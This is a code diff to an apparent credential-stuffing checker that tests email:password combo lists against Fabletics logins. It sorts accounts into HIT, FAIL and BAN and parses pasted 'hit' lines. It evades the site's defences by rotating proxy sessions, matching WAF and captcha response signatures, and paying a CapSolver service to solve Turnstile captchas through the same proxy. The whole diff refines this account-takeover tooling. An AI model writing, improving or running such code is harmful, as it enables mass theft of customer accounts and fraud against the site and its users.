@@ -6,19 +6,22 @@ import time
 from dataclasses import dataclass, field
 from typing import Any
 
-from .captcha import (
-    captcha_api_key,
-    get_capsolver_balance,
-    needs_captcha,
-    solve_login_captcha,
-    turnstile_site_key,
-)
+from .captcha import captcha_api_key, needs_captcha, solve_login_captcha, turnstile_site_key
 from .client import FableticsAPIError, FableticsClient
 from .config import CHECK_DELAY_MAX, CHECK_DELAY_MIN, DEFAULT_PROXY
 from .proxy import parse_proxy, with_rotating_session
 
-# Fabletics returns this sig for gateway/WAF blocks that look like auth failures.
+# Fabletics returns these sigs for gateway/WAF blocks that look like auth failures.
 _GATEWAY_BLOCK_SIG = "6b8cc2452a27b4c6715a03863fc2fd0b"
+_CAPTCHA_AUTH_FAIL_SIG = "420213f9b28468c8a4980b57ecadb337"
+_CAPTCHA_REQUIRED_SIG = "87f230a01ae4df5c3603effb62475ccf"
+# Returned after a valid captcha token when credentials are wrong.
+_INVALID_CREDENTIALS_SIG = "b2796629656acdff42f46921c28de318"
+_CAPTCHA_GATEWAY_SIGS = {
+    _GATEWAY_BLOCK_SIG,
+    _CAPTCHA_AUTH_FAIL_SIG,
+    _CAPTCHA_REQUIRED_SIG,
+}
 
 
 @dataclass
@@ -187,7 +190,7 @@ def resolve_proxy(proxy: str | None = None, *, rotate: bool = True) -> str | Non
     raw = proxy if proxy is not None else os.environ.get("FABLETICS_PROXY") or DEFAULT_PROXY
     if not raw:
         return None
-    parsed = parse_proxy(raw)
+    parsed = parse_proxy(raw) if "://" not in raw else raw
     if rotate and os.environ.get("FABLETICS_ROTATE_PROXY", "1") != "0":
         parsed = with_rotating_session(parsed)
     return parsed
@@ -231,9 +234,41 @@ def _is_captcha(message: str, exc: FableticsAPIError) -> bool:
 def _is_gateway_block(exc: FableticsAPIError, message: str) -> bool:
     if exc.status_code != 403 or not _is_auth_failure(message):
         return False
-    if exc.response_sig and exc.response_sig == _GATEWAY_BLOCK_SIG:
+    if exc.response_sig in _CAPTCHA_GATEWAY_SIGS:
         return True
     if exc.captcha_required or needs_captcha(message):
+        return True
+    return False
+
+
+def _login_needs_captcha(client: FableticsClient, email: str, guest_token: str) -> bool:
+    try:
+        methods = client.get_login_methods(email, guest_token)
+        return bool(methods.get("captcha"))
+    except FableticsAPIError:
+        return False
+
+
+def _password_login_available(client: FableticsClient, email: str, guest_token: str) -> bool:
+    try:
+        methods = client.get_login_methods(email, guest_token)
+        return bool(methods.get("password"))
+    except FableticsAPIError:
+        return True
+
+
+def _needs_captcha_solve(exc: FableticsAPIError, message: str) -> bool:
+    if exc.captcha_required or needs_captcha(message):
+        return True
+    if exc.response_sig in _CAPTCHA_GATEWAY_SIGS:
+        return True
+    return _is_gateway_block(exc, message)
+
+
+def _auth_failure_after_captcha(exc: FableticsAPIError, message: str) -> bool:
+    if exc.status_code == 400 and _is_auth_failure(message):
+        return True
+    if exc.status_code == 403 and exc.response_sig == _INVALID_CREDENTIALS_SIG:
         return True
     return False
 
@@ -289,22 +324,6 @@ def _attempt_check(
     return CheckResult(status="HIT", email=email, password=password, data=data)
 
 
-def _captcha_solve_timeout(timeout: int) -> int:
-    return min(timeout, 45)
-
-
-def _should_skip_captcha_solve() -> str | None:
-    if not captcha_api_key():
-        return "set CAPSOLVER_API_KEY"
-    balance_info = get_capsolver_balance()
-    balance = balance_info.get("balance")
-    if balance is not None and float(balance) < 0.02:
-        return f"CapSolver balance too low (${float(balance):.2f})"
-    if balance_info.get("error") and balance is None:
-        return f"CapSolver balance check failed: {balance_info['error']}"
-    return None
-
-
 def _solve_and_retry(
     client: FableticsClient,
     email: str,
@@ -312,13 +331,12 @@ def _solve_and_retry(
     timeout: int,
     reason: str,
 ) -> CheckResult:
-    skip_reason = _should_skip_captcha_solve()
-    if skip_reason:
+    if not captcha_api_key():
         return CheckResult(
             status="BAN",
             email=email,
             password=password,
-            message=f"{reason} — {skip_reason}",
+            message=f"{reason} — set CAPSOLVER_API_KEY",
         )
     if not turnstile_site_key():
         return CheckResult(
@@ -328,7 +346,10 @@ def _solve_and_retry(
             message=f"{reason} — set TURNSTILE_SITE_KEY",
         )
     try:
-        token = solve_login_captcha(timeout=_captcha_solve_timeout(timeout))
+        token = solve_login_captcha(
+            timeout=min(timeout * 2, 120),
+            proxy=client.proxy_url,
+        )
     except Exception as solve_exc:
         return CheckResult(
             status="BAN",
@@ -354,6 +375,13 @@ def _solve_and_retry(
             timeout=timeout,
         )
     except FableticsAPIError as retry_exc:
+        if _auth_failure_after_captcha(retry_exc, str(retry_exc)):
+            return CheckResult(
+                status="FAIL",
+                email=email,
+                password=password,
+                message="Invalid credentials",
+            )
         return _classify_api_error(retry_exc, email, password)
 
 
@@ -361,7 +389,7 @@ def _check_hard_timeout(timeout: int) -> int:
     env = os.environ.get("FABLETICS_CHECK_TIMEOUT", "").strip()
     if env.isdigit():
         return max(30, int(env))
-    return max(75, timeout * 2)
+    return max(90, timeout * 2)
 
 
 def _check_account_inner(
@@ -372,23 +400,59 @@ def _check_account_inner(
 ) -> CheckResult:
     if proxy is _UNSET:
         resolved_proxy = resolve_proxy()
+    elif proxy:
+        resolved_proxy = resolve_proxy(str(proxy), rotate=False)
     else:
-        resolved_proxy = proxy
+        resolved_proxy = None
     _pace_request()
     client = FableticsClient(proxy=resolved_proxy, timeout=timeout)
 
     try:
-        return _attempt_check(client, email, password, timeout=timeout)
-    except FableticsAPIError as exc:
-        message = str(exc)
-        if _is_gateway_block(exc, message) or exc.captcha_required or needs_captcha(message):
+        guest_token = client.create_guest_session()
+        if not _password_login_available(client, email, guest_token):
+            return CheckResult(
+                status="FAIL",
+                email=email,
+                password=password,
+                message="No password login for this email",
+            )
+
+        if _login_needs_captcha(client, email, guest_token):
             return _solve_and_retry(
                 client,
                 email,
                 password,
                 timeout,
-                "Login gateway blocked (captcha/WAF)",
+                "Login requires captcha",
             )
+
+        try:
+            return _attempt_check(
+                client,
+                email,
+                password,
+                guest_token=guest_token,
+                timeout=timeout,
+            )
+        except FableticsAPIError as exc:
+            message = str(exc)
+            if _needs_captcha_solve(exc, message):
+                return _solve_and_retry(
+                    client,
+                    email,
+                    password,
+                    timeout,
+                    "Login gateway blocked (captcha/WAF)",
+                )
+            if _auth_failure_after_captcha(exc, message):
+                return CheckResult(
+                    status="FAIL",
+                    email=email,
+                    password=password,
+                    message="Invalid credentials",
+                )
+            return _classify_api_error(exc, email, password)
+    except FableticsAPIError as exc:
         return _classify_api_error(exc, email, password)
     except Exception as exc:
         return CheckResult(status="ERROR", email=email, password=password, message=str(exc))
@@ -423,7 +487,6 @@ def parse_combo(line: str) -> tuple[str, str] | None:
     if not line or line.startswith("#"):
         return None
 
-    # Support pasted hit one-liners: email:pass | Points = ...
     if " | " in line:
         line = line.split(" | ", 1)[0].strip()
 
